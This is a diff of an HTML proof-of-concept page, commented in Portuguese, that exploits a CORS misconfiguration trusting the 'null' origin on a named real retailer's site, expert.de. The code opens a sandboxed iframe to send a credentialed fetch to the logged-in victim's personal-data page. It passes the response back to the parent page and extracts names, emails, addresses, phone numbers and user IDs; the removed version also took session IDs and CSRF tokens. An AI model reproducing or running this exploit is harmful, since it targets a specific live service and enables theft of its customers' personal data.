@@ -2,85 +2,120 @@
 <html>
 <head><title>CORS PoC - expert.de</title></head>
 <body>
-<h2>CORS PoC — expert.de — trust_null</h2>
-<p>Status: <b id="status">Aguardando...</b></p>
-<div id="dados" style="display:none;background:#fff3cd;border:2px solid red;padding:15px;border-radius:8px;margin:10px 0">
-  <h3 style="color:red">Dados Exfiltrados:</h3>
-  <pre id="extraido" style="font-size:13px"></pre>
-</div>
-<pre id="output" style="background:#f5f5f5;padding:10px;font-size:11px;max-height:300px;overflow:auto;white-space:pre-wrap;word-break:break-all"></pre>
+<h2>CORS PoC — trust_null</h2>
+<p id="status">Iniciando...</p>
+<pre id="output" style="background:#f5f5f5;padding:15px;overflow:auto;max-height:500px;white-space:pre-wrap;word-break:break-all;font-size:11px"></pre>
 
 <script>
-// Vetor direto — sem iframe
-// O browser envia cookies de expert.de se o usuario estiver logado
-// CORS trust_null permite a leitura da resposta
+document.getElementById('status').textContent = 'Abrindo vetor...';
 
-document.getElementById('status').textContent = 'Fazendo fetch...';
+// Vetor 1: iframe sandbox sem allow-same-origin
+// Gera Origin: null sem herdar contexto do pai
+var iframe = document.createElement('iframe');
+iframe.sandbox = 'allow-scripts';
+iframe.style.display = 'none';
+iframe.srcdoc = `
+<script>
+  var target = 'https://www.expert.de/shop/mein-expert/persoenliche-daten';
+  
+  fetch(target, {
+    method: 'GET',
+    credentials: 'include',
+    mode: 'cors'
+  })
+  .then(function(r) {
+    var status = r.status;
+    var acao = r.headers.get('access-control-allow-origin');
+    var acac = r.headers.get('access-control-allow-credentials');
+    return r.text().then(function(body) {
+      parent.postMessage({
+        type: 'result',
+        status: status,
+        acao: acao,
+        acac: acac,
+        bodyLength: body.length,
+        bodySnippet: body.substring(0, 500),
+        body: body
+      }, '*');
+    });
+  })
+  .catch(function(e) {
+    parent.postMessage({
+      type: 'error',
+      message: e.toString()
+    }, '*');
+  });
+<\/script>
+`;
 
-fetch('https://www.expert.de/shop/mein-expert/persoenliche-daten', {
-  method: 'GET',
-  credentials: 'include',
-  mode: 'cors'
-})
-.then(function(r) {
-  var acao = r.headers.get('access-control-allow-origin');
-  var acac = r.headers.get('access-control-allow-credentials');
-  document.getElementById('output').textContent =
-    'ACAO: ' + acao + '\nACAC: ' + acac + '\nStatus: ' + r.status;
-  return r.text();
-})
-.then(function(html) {
-  document.getElementById('output').textContent += '\nBytes: ' + html.length;
+document.body.appendChild(iframe);
 
-  // Extrair __NUXT_DATA__
-  var match = html.match(/<script[^>]+id="__NUXT_DATA__"[^>]*>([\s\S]*?)<\/script>/);
-  if (!match) {
-    document.getElementById('status').innerHTML =
-      '<span style="color:orange">Resposta recebida mas sem __NUXT_DATA__ — usuário não autenticado no fetch.</span>';
+window.addEventListener('message', function(e) {
+  var d = e.data;
+  
+  if (d.type === 'error') {
+    document.getElementById('status').innerHTML = 
+      '<span style="color:red">ERRO: ' + d.message + '</span>';
+    document.getElementById('output').textContent = d.message;
     return;
   }
-
-  var arr = JSON.parse(match[1]);
-  var dados = {};
-  var campos = {
-    firstName:'Nome', lastName:'Sobrenome', email:'Email',
-    street:'Rua', houseNumber:'Número', zip:'CEP', city:'Cidade',
-    countryCode:'País', telephone:'Telefone', userId:'UserID',
-    sessionIdentifier:'SessionID', csrfToken:'CSRF Token'
-  };
-
-  for (var i = 0; i < arr.length; i++) {
-    var item = arr[i];
-    if (item && typeof item === 'object' && !Array.isArray(item)) {
-      Object.keys(campos).forEach(function(campo) {
-        if (item[campo] !== undefined) {
-          var val = arr[item[campo]];
-          if (val && typeof val === 'string' && val !== 'null') {
-            dados[campo] = val;
-          }
-        }
-      });
+  
+  if (d.type === 'result') {
+    var sucesso = d.acao === 'null' && d.acac === 'true';
+    
+    document.getElementById('status').innerHTML = sucesso
+      ? '<span style="color:green">✔ VULNERÁVEL — ACAO: ' + d.acao + ' | Credentials: ' + d.acac + ' | HTTP ' + d.status + ' | ' + d.bodyLength + ' bytes recebidos</span>'
+      : '<span style="color:orange">ACAO: ' + d.acao + ' | HTTP ' + d.status + '</span>';
+    
+    // Tentar extrair dados pessoais do HTML
+    var parser = new DOMParser();
+    var doc = parser.parseFromString(d.body, 'text/html');
+    var extraidos = [];
+    
+    // Pegar inputs com valor
+    doc.querySelectorAll('input[value]').forEach(function(el) {
+      if (el.value && el.value.trim()) {
+        extraidos.push('INPUT [' + (el.name || el.id) + ']: ' + el.value);
+      }
+    });
+    
+    // Procurar padrões de dados no HTML bruto
+    var patterns = [
+      { name: 'Email', regex: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g },
+      { name: 'Nome', regex: /"firstName"\s*:\s*"([^"]+)"/g },
+      { name: 'Sobrenome', regex: /"lastName"\s*:\s*"([^"]+)"/g },
+      { name: 'Rua', regex: /"street"\s*:\s*"([^"]+)"/g },
+      { name: 'CEP', regex: /"zip"\s*:\s*"([^"]+)"/g },
+      { name: 'Cidade', regex: /"city"\s*:\s*"([^"]+)"/g },
+      { name: 'Telefone', regex: /"telephone"\s*:\s*"([^"]+)"/g },
+      { name: 'UserId', regex: /"userId"\s*:\s*"([^"]+)"/g }
+    ];
+    
+    patterns.forEach(function(p) {
+      var matches = d.body.match(p.regex);
+      if (matches) {
+        extraidos.push(p.name + ': ' + matches.slice(0, 3).join(', '));
+      }
+    });
+    
+    var saida = '';
+    
+    if (extraidos.length > 0) {
+      saida += '=== DADOS PESSOAIS EXTRAÍDOS ===\n\n';
+      saida += extraidos.join('\n');
+      saida += '\n\n';
     }
+    
+    saida += '=== HEADERS DA RESPOSTA ===\n';
+    saida += 'Access-Control-Allow-Origin: ' + d.acao + '\n';
+    saida += 'Access-Control-Allow-Credentials: ' + d.acac + '\n';
+    saida += 'HTTP Status: ' + d.status + '\n';
+    saida += 'Tamanho da resposta: ' + d.bodyLength + ' bytes\n\n';
+    saida += '=== PRIMEIROS 500 CHARS DO BODY ===\n\n';
+    saida += d.bodySnippet;
+    
+    document.getElementById('output').textContent = saida;
   }
-
-  var linhas = Object.keys(campos).map(function(k) {
-    return dados[k] ? campos[k] + ': ' + dados[k] : null;
-  }).filter(Boolean);
-
-  if (linhas.length > 0) {
-    document.getElementById('extraido').textContent = linhas.join('\n');
-    document.getElementById('dados').style.display = 'block';
-    document.getElementById('status').innerHTML =
-      '<span style="color:red;font-size:16px">VULNERÁVEL — Dados exfiltrados!</span>';
-  } else {
-    document.getElementById('status').innerHTML =
-      '<span style="color:orange">__NUXT_DATA__ encontrado mas sem dados de auth — cookies de sessão não foram enviados.</span>';
-  }
-})
-.catch(function(e) {
-  document.getElementById('status').innerHTML =
-    '<span style="color:red">ERRO: ' + e + '</span>';
-  document.getElementById('output').textContent = e.toString();
 });
 </script>
 </body>
